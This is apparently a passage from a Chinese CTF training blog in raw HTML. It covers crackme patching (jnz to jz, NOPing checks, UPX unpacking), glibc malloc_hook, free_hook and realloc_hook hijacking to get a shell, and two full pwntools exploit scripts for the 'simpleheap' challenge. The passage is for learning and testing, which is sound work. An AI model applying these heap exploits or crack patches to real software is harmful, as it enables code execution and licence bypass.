class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;How many levels?\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Any more?\n&#x27;</span>,<span class="built_in">str</span>(offset_addr))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#level内部存在递归调用,当v5&gt;999时取1000次递归</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">999</span>):  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;Question: &#x27;</span>)  </span><br><span class="line">   a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.recvuntil(<span class="string">b&#x27;* &#x27;</span>)  </span><br><span class="line">   b = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>))  </span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;Answer:&#x27;</span>,<span class="built_in">str</span>(a*b))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsyscall)*<span class="number">3</span>  </span><br><span class="line">  </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Answer:&#x27;</span>,payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="任务Ⅲ"><a href="#任务Ⅲ" class="headerlink" title="任务Ⅲ"></a>任务Ⅲ</h1><h2 id="crackme4-ajj1"><a href="#crackme4-ajj1" class="headerlink" title="crackme4-ajj1"></a>crackme4-ajj1</h2><p>字符串智能搜索发现</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-07-24_202900.png" alt=""></p><p>双击跟随</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0045803B  |. /75 76         jnz short CKme.004580B3</span><br><span class="line">0045803D  |. |33DB          xor ebx,ebx</span><br><span class="line">0045803F  |&gt; |8D55 E4       /lea edx,[local.7]</span><br><span class="line">00458042  |. |8B86 D4020000 |mov eax,dword ptr ds:[esi+0x2D4]</span><br><span class="line">00458048  |. |E8 FBB2FCFF   |call CKme.00423348</span><br><span class="line">0045804D  |. |8B45 E4       |mov eax,[local.7]                       ;  CKme.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00458050  |. |E8 27BBFAFF   |call CKme.00403B7C</span><br><span class="line">00458055  |. |83C0 03       |add eax,0x3</span><br><span class="line">00458058  |. |8D55 E8       |lea edx,[local.6]</span><br><span class="line">0045805B  |. |E8 A4FAFAFF   |call CKme.00407B04</span><br><span class="line">00458060  |. |FF75 E8       |push [local.6]                          ;  CKme.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00458063  |. |8D55 E0       |lea edx,[local.8]</span><br><span class="line">00458066  |. |8B86 D4020000 |mov eax,dword ptr ds:[esi+0x2D4]</span><br><span class="line">0045806C  |. |E8 D7B2FCFF   |call CKme.00423348</span><br><span class="line">00458071  |. |FF75 E0       |push [local.8]</span><br><span class="line">00458074  |. |8D55 DC       |lea edx,[local.9]</span><br><span class="line">00458077  |. |8BC3          |mov eax,ebx</span><br><span class="line">00458079  |. |E8 86FAFAFF   |call CKme.00407B04</span><br><span class="line">0045807E  |. |FF75 DC       |push [local.9]                          ;  CKme.004415B7</span><br><span class="line">00458081  |. |8D45 FC       |lea eax,[local.1]</span><br><span class="line">00458084  |. |BA 03000000   |mov edx,0x3</span><br><span class="line">00458089  |. |E8 AEBBFAFF   |call CKme.00403C3C</span><br><span class="line">0045808E  |. |43            |inc ebx</span><br><span class="line">0045808F  |. |83FB 13       |cmp ebx,0x13</span><br><span class="line">00458092  |.^|75 AB         \jnz short CKme.0045803F</span><br><span class="line">00458094  |. |33D2          xor edx,edx</span><br><span class="line">00458096  |. |8B86 F0020000 mov eax,dword ptr ds:[esi+0x2F0]</span><br><span class="line">0045809C  |. |E8 BFB1FCFF   call CKme.00423260</span><br><span class="line">004580A1  |. |A1 20B84500   mov eax,dword ptr ds:[0x45B820]</span><br><span class="line">004580A6  |. |83C0 70       add eax,0x70</span><br><span class="line">004580A9  |. |BA 14814500   mov edx,CKme.00458114                    ;  恭喜恭喜！注册成功</span><br><span class="line">004580AE  |. |E8 9DB8FAFF   call CKme.00403950</span><br><span class="line">004580B3  |&gt; \33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>存在两个关键跳转指令</p><p>断点跟随发现确实关键点在这</p><p>jnz都修改为jz</p><p>即成功crackme</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-07-24_203704.png" alt=""></p><h2 id="crackme4-ajj2"><a href="#crackme4-ajj2" class="headerlink" title="crackme4-ajj2"></a>crackme4-ajj2</h2><p>ollydbg打开提示说存在加壳</p><p>die一查是upx壳</p><p><code>upx.exe -d ckme002</code>脱壳</p><p>之后还是常规的查找字符串跟随</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-07-24_204459.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">004473F1   . /0F84 88000000 je CKme002.0044747F</span><br><span class="line">004473F7   . |81BB 08030000&gt;cmp dword ptr ds:[ebx+0x308],0x230D</span><br><span class="line">00447401   . |74 7C         je short CKme002.0044747F</span><br><span class="line">00447403   . |81BB 10030000&gt;cmp dword ptr ds:[ebx+0x310],0xF94</span><br><span class="line">0044740D   . |75 70         jnz short CKme002.0044747F</span><br><span class="line">0044740F   . |8B83 18030000 mov eax,dword ptr ds:[ebx+0x318]</span><br><span class="line">00447415   . |3B83 14030000 cmp eax,dword ptr ds:[ebx+0x314]</span><br><span class="line">0044741B   . |75 62         jnz short CKme002.0044747F</span><br><span class="line">0044741D   . |81BB 1C030000&gt;cmp dword ptr ds:[ebx+0x31C],0x3E7</span><br><span class="line">00447427   . |74 56         je short CKme002.0044747F</span><br><span class="line">00447429   . |33D2          xor edx,edx                              ;  CKme002.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0044742B   . |8B83 D8020000 mov eax,dword ptr ds:[ebx+0x2D8]</span><br><span class="line">00447431   . |8B08          mov ecx,dword ptr ds:[eax]</span><br><span class="line">00447433   . |FF51 5C       call dword ptr ds:[ecx+0x5C]</span><br><span class="line">00447436   . |33D2          xor edx,edx                              ;  CKme002.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00447438   . |8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]</span><br><span class="line">0044743E   . |8B08          mov ecx,dword ptr ds:[eax]</span><br><span class="line">00447440   . |FF51 5C       call dword ptr ds:[ecx+0x5C]</span><br><span class="line">00447443   . |33D2          xor edx,edx                              ;  CKme002.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00447445   . |8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]</span><br><span class="line">0044744B   . |8B08          mov ecx,dword ptr ds:[eax]</span><br><span class="line">0044744D   . |FF51 5C       call dword ptr ds:[ecx+0x5C]</span><br><span class="line">00447450   . |33D2          xor edx,edx                              ;  CKme002.&lt;ModuleEntryPoint&gt;</span><br><span class="line">00447452   . |8B83 E4020000 mov eax,dword ptr ds:[ebx+0x2E4]</span><br><span class="line">00447458   . |8B08          mov ecx,dword ptr ds:[eax]</span><br><span class="line">0044745A   . |FF51 5C       call dword ptr ds:[ecx+0x5C]</span><br><span class="line">0044745D   . |A1 A8984400   mov eax,dword ptr ds:[0x4498A8]</span><br><span class="line">00447462   . |83C0 70       add eax,0x70</span><br><span class="line">00447465   . |BA 8C744400   mov edx,CKme002.0044748C                 ;  厉害厉害真厉害！佩服佩服真佩服！！</span><br><span class="line">0044746A   . |E8 EDC4FBFF   call CKme002.0040395C</span><br><span class="line">0044746F   . |BA B8744400   mov edx,CKme002.004474B8                 ;  注册了</span><br><span class="line">00447474   . |8B83 EC020000 mov eax,dword ptr ds:[ebx+0x2EC]</span><br><span class="line">0044747A   . |E8 3DCCFDFF   call CKme002.004240BC</span><br><span class="line">0044747F   &gt; \5B            pop ebx                                  ;  kernel32.76FCFA29</span><br><span class="line">00447480   .  C3            retn</span><br></pre></td></tr></table></figure><p>发现所有的跳转都是跳过成功,将所有的跳转nop即可</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-07-24_204852.png" alt=""></p><h2 id="crackme5"><a href="#crackme5" class="headerlink" title="crackme5-"></a>crackme5-</h2><h1 id="任务Ⅳ"><a href="#任务Ⅳ" class="headerlink" title="任务Ⅳ"></a>任务Ⅳ</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在调用malloc或者free的时候，如果 <strong>malloc_hook 和free_hook的值存在</strong>，<strong>则会调用malloc_hook或者free_hook指向的地址</strong>，假设在使用one_gadget的时候满足one_gadget的调用条件，当overwrite malloc_hook和free_hook的时候，便可以getshell，执行malloc的时候，其参数是size大小，所以overwrite malloc_hook的时候使用one_gadget的地址可以getshell。执行free的时候，可以将__free_hook的值overwrite为system的地址，通过释放(/bin/sh\x00)的chunk，可以达到system(/bin/sh)来getshell</p><ul><li>malloc_hook位于main_arena下方的位置(绝大多时候是0x10)，可以通过fake chunk来overwrite该值实现getshell</li><li>free_hook 位于libc上_free_hook上，可以通过fake chunk来overwrite该值达到劫持程序流的目的</li></ul><h2 id="malloc-hook利用"><a href="#malloc-hook利用" class="headerlink" title="malloc_hook利用"></a>malloc_hook利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><ul><li>利用思路：在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在，将调用malloc_hook指向的地址call rax，如果我们将该值overite 为one_gadget，当程序执行malloc的时候，便可以getshell</li></ul><h2 id="free-hook利用"><a href="#free-hook利用" class="headerlink" title="free_hook利用"></a>free_hook利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>利用思路：<ul><li>通过改写main_arena中的top_chunk的地址，将top_chunk的值改写到<strong>free_hook上方指定的位置，通过不断向top_chunk申请chunk，最终可以分配到包含</strong>free_hook的区块，从而可以改写__free_hook的值。</li><li>通过改写global_max_fast的值，可以在free_hook的上方找到一个足够大包含free_hook的块，当改写了global_max_fast后，向heap申请的块都将按照fastbin来处理</li><li>通过unsorted bin attack 在free_hook上方<strong>伪造 0x7f大小的chunk</strong>,再通过fastbin attack 来修改free_hoook的值</li></ul></li></ul><h2 id="realloc-hook与malloc-hook的联合利用"><a href="#realloc-hook与malloc-hook的联合利用" class="headerlink" title="realloc_hook与malloc_hook的联合利用"></a>realloc_hook与malloc_hook的联合利用</h2><p>因为</p><p>realloc_hook与malloc_hook 相似是一个弱类型的指针.在调用realloc()函数是会判断realloc_hook的值是否为空,不为空则执行其执行的代码.这是realloc_hook的一种用法。</p><p>大多时候在执行onegadget时,并不容易满足限制条件,故而可以利用realloc()来调整栈帧以满足条件</p><p>即可以用malloc_hook来指向_libc_realloc()函数内部(即强行调用realloc())然后通过realloc_hook来触发one_gadget.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000009</span>AE84 <span class="number">41</span> <span class="number">57</span>                         push    r15</span><br><span class="line">.text:<span class="number">000000000009</span>AE86 <span class="number">41</span> <span class="number">56</span>                         push    r14</span><br><span class="line">.text:<span class="number">000000000009</span>AE88 <span class="number">41</span> <span class="number">55</span>                         push    r13</span><br><span class="line">.text:<span class="number">000000000009</span>AE8A <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">000000000009</span>AE8C <span class="number">49</span> <span class="number">89</span> F4                      mov     r12, rsi</span><br><span class="line">.text:<span class="number">000000000009</span>AE8F <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">000000000009</span>AE90 <span class="number">48</span> <span class="number">89</span> FD                      mov     rbp, rdi</span><br><span class="line">.text:<span class="number">000000000009</span>AE93 <span class="number">53</span>                            push    rbx</span><br><span class="line">.text:<span class="number">000000000009</span>AE94 <span class="number">48</span> <span class="number">83</span> EC <span class="number">18</span>                   sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">000000000009</span>AE98 <span class="number">48</span> <span class="number">8B</span> <span class="number">05</span> <span class="number">41</span> <span class="number">11</span> <span class="number">15</span> <span class="number">00</span>          mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:<span class="number">000000000009</span>AE9F <span class="number">48</span> <span class="number">8B</span> <span class="number">00</span>                      mov     rax, [rax]</span><br><span class="line">.text:<span class="number">000000000009</span>AEA2 <span class="number">48</span> <span class="number">85</span> C0                      test    rax, rax</span><br><span class="line">.text:<span class="number">000000000009</span>AEA5 <span class="number">0F</span> <span class="number">85</span> <span class="number">35</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>             jnz     loc_9B0E0</span><br></pre></td></tr></table></figure><p><code>malloc -&gt; malloc_hook -&gt; realloc -&gt; realloc_hook -&gt; onegadget</code></p><p>我们可以将realloc_hook改为onegadget，然后通过这些push和sub操作”微调”rsp寄存器，使其能够满足在调用realloc_hook（也就是onegadget）的时候满足相应的rsp条件。相应的利用方法就是由传统的直接修改malloc_hook变为先修改realloc_hook为onegadget之后，修改malloc_hook到特定的一个push处或sub处，然后调用malloc便相当于执行了满足条件的onegadget。</p><p><strong>此外符号__malloc_hook与__realloc_hook在数据段中是相邻的,realloc在前</strong></p><p><strong>__free_hook的位置与前二者不相邻</strong></p><p>参数也有差异,_malloc_hook与__realloc_hook的参数为申请的chunk的大小</p><p>__free_hook的参数则为释放的chunk的地址</p><h2 id="v-amp-n2020招新赛simpleheap"><a href="#v-amp-n2020招新赛simpleheap" class="headerlink" title="v&amp;n2020招新赛simpleheap"></a>v&amp;n2020招新赛simpleheap</h2><p>核心利用是off-by-one以及unsortedbin attack</p><p>程序的漏洞在于其edit函数存在off-by-one，以此来修改下一个chunk的size域</p><p>并利用unsortedbin的切割特性来泄露mainarena+88,来得到libc_base</p><p>再通过伪造一个fakechunk(可写hook)到fastbins链上,使得两次分配得到该chunk并覆写mallochook和reallochook</p><p>不直接覆盖mallochook为onegadget的原因是,四个onegadget的条件都不满足,故只能通过realloc函数来调整栈帧并调用reallochook为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./vn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">gdb.attach(p) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"> </span><br><span class="line">one = <span class="number">0x4527a</span></span><br><span class="line">onegadget = libc_base + one</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">b&#x27;\n&#x27;</span><span class="comment">#这两个换行很重要,没有换行就会卡住不知道为什么</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">-----------------------又或者另一个有微小差异的版本--------------------------------------</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./vn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3 阻断top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span 